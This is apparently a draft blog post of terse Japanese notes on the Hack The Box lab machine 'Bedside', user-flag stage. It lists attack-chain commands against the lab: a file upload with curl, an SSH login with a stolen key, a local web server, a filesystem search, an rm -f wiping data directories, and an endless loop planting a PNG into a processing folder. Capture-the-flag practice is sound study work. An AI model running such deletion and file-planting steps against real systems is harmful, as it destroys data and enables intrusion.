+++
author = "Hugo Authors"
title = "HTB Bedside"
date = "2026-07-25"
description = ""
tags = [
    "HTB",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
draft = true
+++

HTB Bedsideのメモ．
<!--more-->

## User Flag




curl -s -F "uploadFile=@main.pdf" http://research.bedside.htb/





$ ssh -o KexAlgorithms=curve25519-sha256 -o HostKeyAlgorithms=ssh-ed25519 -o IPQoS=none -i dev_key developer@10.129.11.214 


python3 -m http.server 8000



datawrangler@data-wrangler:/app$ find / -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" 2>/dev/null | grep -v "/proc"
find / -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" 2>/dev/null | grep -v "/proc"
/usr/local/lib/python3.12/idlelib/Icons/idle_48.png
/usr/local/lib/python3.12/idlelib/Icons/idle_256.png
/usr/local/lib/python3.12/idlelib/Icons/idle_32.png
/usr/local/lib/python3.12/idlelib/Icons/idle_16.png
/usr/share/pixmaps/debian-logo.png


残ってしまっている古いダミーファイルの全削除(本来はしなくてよい)
rm -f /datastore/processed/* /datastore/staging/* 2>/dev/null

本物のPNGだけを配置する高速ループの再起動
while true; do
  cp /usr/share/pixmaps/debian-logo.png /datastore/processed/dummy.png 2>/dev/null
done